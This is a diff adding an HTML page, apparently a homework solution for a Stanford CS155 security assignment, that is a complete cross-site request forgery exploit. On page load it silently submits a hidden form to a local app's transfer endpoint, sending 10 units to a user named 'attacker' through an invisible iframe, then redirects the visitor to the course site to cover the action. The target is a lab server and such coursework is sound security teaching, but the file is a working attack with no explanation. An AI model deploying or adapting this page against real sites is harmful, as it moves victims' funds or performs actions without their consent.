@@ -1,0 +1,19 @@
+<html>
+    <head>
+        <title>Assignment 5 - B</title>
+    </head>
+
+    <body onload="document.getElementById('csrfForm').submit();">
+        <form id="csrfForm" action="http://localhost:3000/post_transfer" method="POST" target="hiddenFrame">
+            <input type="hidden" name="destination_username" value="attacker">
+            <input type="hidden" name="quantity" value="10">
+        </form>
+    </body>
+
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+    <script>
+        setTimeout(() => {
+            window.location.href = "https://cs155.stanford.edu/";
+          }, 100); 
+    </script>
+</html>
